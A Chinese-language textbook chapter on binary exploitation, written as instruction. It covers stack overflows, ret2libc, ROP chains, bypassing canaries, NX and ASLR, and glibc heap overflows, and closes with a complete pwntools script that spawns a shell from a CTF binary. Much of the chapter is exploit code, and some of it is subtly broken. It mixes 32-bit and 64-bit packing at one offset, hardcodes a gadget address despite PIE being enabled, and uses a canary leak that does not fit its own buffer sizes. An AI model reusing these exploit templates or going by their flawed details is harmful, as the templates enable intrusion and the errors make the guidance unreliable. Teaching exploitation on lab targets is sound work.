## 12.1 栈溢出基础

### 12.1.1 原理与危害

**栈溢出**（Stack Buffer Overflow）是程序向栈上的缓冲区写入超出其容量的数据，导致覆盖返回地址的漏洞。

**危害**：
- 控制程序执行流（RCE）
- 提权（本地提权）
- 拒绝服务（DoS）

### 12.1.2 经典栈溢出示例

**漏洞代码**：
```c
// vuln.c
#include <stdio.h>
#include <string.h>

void vulnerable() {
    char buffer[100];
    gets(buffer);  // 危险的函数！
}

int main() {
    vulnerable();
    return 0;
}
```

**编译**（关闭保护）：
```bash
gcc -g -fno-stack-protector -no-pie -o vuln vuln.c
```

**利用原理**：

1. **栈布局**：
   ```
   High Address
   ┌─────────────┐
   │ 参数        │
   ├─────────────┤
   │ 返回地址    │ ← 目标：覆盖此地址
   ├─────────────┤
   │ 保存的 EBP  │
   ├─────────────┤
   │ 局部变量     │
   │ buffer[100] │ ← 溢出起点
   └─────────────┘
   Low Address
   ```

2. **覆盖返回地址**：
   ```python
   # payload.py
   payload = b'A' * 100  # 填充 buffer
   payload += b'BBBB'      # 覆盖保存的 EBP
   payload += b'CCCC'      # 覆盖返回地址（目标：0x43434343）
   
   print(payload)
   ```

3. **控制执行流**：
   ```bash
   python payload.py | ./vuln
   # 程序崩溃，EIP = 0x43434343
   ```

### 12.1.3 漏洞利用步骤

**步骤1：确定偏移量**

使用 `pwndbg` 的 `cyclic` 工具：
```bash
gdb -q ./vuln
pwndbg> cyclic 200  # 生成 200 字节的 cyclic pattern
aaaabaaacaaadaaaeaaa...

# 运行程序，输入 pattern
pwndbg> r
Starting program: /home/vuln/vuln
aaaabaaacaaadaaaeaaa...

# 程序崩溃，查看 EIP
pwndbg> info registers eip
eip 0x6161616c  # pattern 中的位置是 112
```

**计算偏移**：
```bash
pwndbg> cyclic -l 0x6161616c
112  # buffer 到返回地址的偏移是 112 字节
```

**步骤2：构造 payload**

```python
# exploit.py
payload = b'A' * 112  # 填充 buffer 到返回地址
payload += p32(0xdeadbeef)  # 覆盖返回地址

print(payload)
```

**步骤3：验证利用**

```bash
python exploit.py | ./vuln
# 程序崩溃，EIP = 0xdeadbeef ✓
```

## 12.2 Ret2Libc 与 ROP

### 12.2.1 Ret2Libc（返回到 Libc）

**原理**：覆盖返回地址为 libc 中的函数（如 `system()`），执行任意命令。

**利用条件**：
- 需要知道 libc 基地址（绕过 ASLR）
- 需要知道 `system()` 的地址

**示例**：

**步骤1：信息泄露（绕过 ASLR）**

```c
// info_leak.c
#include <stdio.h>

void vulnerable() {
    char buffer[100];
    gets(buffer);
}

int main() {
    printf("puts() address: %p\n", puts);
    vulnerable();
    return 0;
}
```

**运行**：
```bash
./info_leak
puts() address: 0x7ffff7e5a870  # 泄露 libc 地址
```

**步骤2：计算 libc 基地址**

```python
# 从泄露的地址计算 libc 基地址
puts_addr = 0x7ffff7e5a870
puts_offset = 0x84470  # 从 libc 文件中获取
libc_base = puts_addr - puts_offset
```

**步骤3：构造 Ret2Libc payload**

```python
# exploit.py
from pwn import *

libc_base = 0x7ffff7e00000
system_offset = 0x4f4e0
binsh_offset = 0x1b40fa

system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset

payload = b'A' * 112
payload += p32(system_addr)
payload += p32(0xdeadbeef)  # system() 返回地址
payload += p32(binsh_addr)    # system() 参数

print(payload)
```

### 12.2.2 ROP（Return-Oriented Programming）

**原理**：通过串联多个 gadget（以 `ret` 结尾的代码片段），执行任意操作。

**Gadget 示例**：
```assembly
pop rdi; ret   # 设置第一个参数
pop rsi; ret   # 设置第二个参数
pop rdx; ret   # 设置第三个参数
```

**构造 ROP 链**：

**目标**：执行 `system("/bin/sh")`

**步骤1：查找 gadget**

```bash
ROPgadget --binary ./vuln --only "pop|ret"
```

输出：
```
0x00000000004012b3 : pop rdi ; ret
```

**步骤2：构造 payload**

```python
# exploit.py
from pwn import *

pop_rdi = 0x4012b3
system_addr = 0x7ffff7e4f4e0
binsh_addr = 0x7ffff7fc40fa

payload = b'A' * 112
payload += p64(pop_rdi)      # gadget: pop rdi; ret
payload += p64(binsh_addr)  # 参数："/bin/sh"
payload += p64(system_addr)  # 调用 system()
payload += p64(0xdeadbeef)  # system() 返回地址

print(payload)
```

### 12.2.3 ROP 自动化工具

**ROPgadget**：
```bash
# 查找所有 gadget
ROPgadget --binary ./vuln

# 查找特定 gadget
ROPgadget --binary ./vuln --only "pop|ret"
ROPgadget --binary ./vuln --only "mov|ret"
```

**rp++**：
```bash
rp++ -f ./vuln -r 3  # 查找 3 字节的 gadget
```

**angrop**（angr 框架）：
```python
import angr
import claripy

proj = angr.Project('./vuln')
rop = proj.analyses.ROP()
rop.find_gadgets()

# 构造 ROP 链
chain = rop.execve("/bin/sh")
print(chain.payload_str())
```

## 12.3 绕过栈保护机制

### 12.3.1 Stack Canary 绕过

**Stack Canary** 是在返回地址前插入的随机值，检测栈溢出。

**绕过技术**：

**1. 信息泄露（泄露 Canary）**

```c
// vuln.c
#include <stdio.h>
#include <string.h>

void vulnerable() {
    char buffer[100];
    gets(buffer);
    printf("You said: %s\n", buffer);  // 泄露 Canary
}

int main() {
    vulnerable();
    return 0;
}
```

**利用**：
```python
# exploit.py
from pwn import *

# 第一步：泄露 Canary
payload = b'A' * 100  # 填充 buffer
p.send(payload + b'\n')

# 读取输出，提取 Canary
output = p.recv()
canary = u64(output[112:120])  # Canary 在偏移 112 处

# 第二步：构造 payload（包含正确的 Canary）
payload = b'A' * 100
payload += p64(canary)      # 正确的 Canary
payload += b'BBBBBBBB'      # 保存的 RBP
payload += p64(target_addr)  # 覆盖返回地址

p.send(payload + b'\n')
```

**2. Brute Force（暴力破解）**

如果 Canary 是随机生成的，但每次 fork() 后 Canary 不变（如多线程程序），可以逐字节爆破。

### 12.3.2 NX（No-eXecute）绕过

**NX** 标记栈为不可执行，防止执行 shellcode。

**绕过技术**：

**1. Ret2Libc**（见 12.2.1）

**2. ROP**（见 12.2.2）

**3. Ret2VDSO/VSyscall**

某些内核映射区域是可执行的（如 VDSO），可以用于绕过 NX。

### 12.3.3 ASLR（Address Space Layout Randomization）绕过

**ASLR** 随机化栈、堆、libc 的地址。

**绕过技术**：

**1. 信息泄露**（见 12.2.1）

**2. Partial Overwrite（部分覆盖）**

如果 ASLR 随机化程度不高（如仅随机化 12 位），可以爆破低地址。

**3. 堆喷射（Heap Spraying）**

在堆上填充大量 shellcode，然后跳转到堆地址。

## 12.4 堆溢出基础

### 12.4.1 原理与危害

**堆溢出**（Heap Buffer Overflow）是程序向堆上的缓冲区写入超出其容量的数据，导致覆盖相邻堆块的元数据。

**危害**：
- 覆盖函数指针（执行任意代码）
- 修改 chunk 大小（任意内存读写）
- DoS（崩溃）

### 12.4.2 glibc 堆管理器（ptmalloc2）

**堆块结构**：

```c
struct malloc_chunk {
    size_t prev_size;  // 前一个 chunk 的大小（如果前一个 chunk 是 free）
    size_t size;        // 当前 chunk 的大小（低 3 位为标志位）
    struct malloc_chunk* fd;  // 前向指针（仅 free chunk）
    struct malloc_chunk* bk;  // 后向指针（仅 free chunk）
    char user_data[0];       // 用户数据
};
```

**Bins**：
- **fastbin**：单链表，存放小 chunk（< 64 字节）
- **smallbin**：双链表，存放中等 chunk（< 512 字节）
- **largebin**：双链表，存放大 chunk
- **tcache**：单链表，快速分配/释放（glibc 2.26+）

### 12.4.3 经典堆溢出示例

**漏洞代码**：
```c
// heap_vuln.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    char *buf1 = malloc(100);
    char *buf2 = malloc(100);
    
    gets(buf1);  // 溢出 buf1，覆盖 buf2 的元数据
    
    free(buf2);  // 触发漏洞
    return 0;
}
```

**利用原理**：

1. **覆盖 fd 指针**：
   ```python
   # payload.py
   payload = b'A' * 100  # 填充 buf1
   payload += p64(0xdeadbeef)  # 覆盖 buf2 的 size
   payload += p64(0x41414141)  # 覆盖 buf2 的 fd（目标：任意地址）
   
   print(payload)
   ```

2. **任意地址写入**：
   ```python
   # 修改 __malloc_hook 为 one_gadget
   payload = b'A' * 100
   payload += p64(0xdeadbeef)
   payload += p64(__malloc_hook - 0x10)  # fd 指向 __malloc_hook - 0x10
   
   # 分配 chunk，修改 __malloc_hook
   malloc(100)  # 返回 __malloc_hook - 0x10
   ```

## 12.5 堆保护机制及其绕过

### 12.5.1 PIC/PIE（Position Independent Executable）

**PIC/PIE** 随机化可执行文件的基地址。

**绕过**：信息泄露（泄露可执行文件中的地址）

### 12.5.2 RELRO（RELocation Read-Only）

**RELRO** 保护重定位表（GOT）不被篡改。

**类型**：
- **Partial RELRO**：GOT 可写
- **Full RELRO**：GOT 只读（需要 `-Wl,-z,relro,-z,now`）

**绕过**：
- Partial RELRO：修改 GOT 表项
- Full RELRO：难以绕过，需要信息泄露 + 其他漏洞

## 12.6 实战：从栈溢出到 RCE

### 12.6.1 漏洞发现

**目标**：某 CTF 题目 `stack_lab`

**逆向分析**（IDA Pro）：
```c
// vuln_function()
char buffer[100];
gets(buffer);  // 栈溢出
```

**保护检查**：
```bash
checksec --file=stack_lab
```

输出：
```
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
```

### 12.6.2 漏洞利用

**步骤1：信息泄露（绕过 PIE + ASLR）**

```python
# exploit.py
from pwn import *

p = process('./stack_lab')

# 泄露 puts() 地址
p.sendline(b'%7$s' + b'A' * 100)  # 格式化字符串泄露
puts_addr = u64(p.recv(8))
log.info(f'puts() address: {hex(puts_addr)}')

# 计算 libc 基地址
libc_base = puts_addr - 0x84470
log.info(f'libc base: {hex(libc_base)}')
```

**步骤2：构造 ROP 链**

```python
# 查找 gadget
pop_rdi = 0x4012b3  # 从 ROPgadget 获取

# 计算 system() 和 "/bin/sh" 地址
system_addr = libc_base + 0x4f4e0
binsh_addr = libc_base + 0x1b40fa

# 构造 payload
payload = b'A' * 112
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)

p.sendline(payload)
p.interactive()  # 获取 shell
```

### 12.6.3 完整利用脚本

```python
#!/usr/bin/env python3
from pwn import *

context.binary = './stack_lab'
context.terminal = ['gnome-terminal', '-e']

p = process('./stack_lab')
# p = remote('challenge.ctf.com', 1337)

# 步骤1：信息泄露
p.recvuntil(b'What is your name?\n')
p.sendline(b'%7$s' + b'A' * 100)

puts_addr = u64(p.recv(8))
log.info(f'puts() address: {hex(puts_addr)}')

libc_base = puts_addr - 0x84470
log.info(f'libc base: {hex(libc_base)}')

# 步骤2：构造 ROP 链
pop_rdi = 0x4012b3
system_addr = libc_base + 0x4f4e0
binsh_addr = libc_base + 0x1b40fa

payload = b'A' * 112
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)

p.recvuntil(b'What do you want to say?\n')
p.sendline(payload)

p.interactive()
```
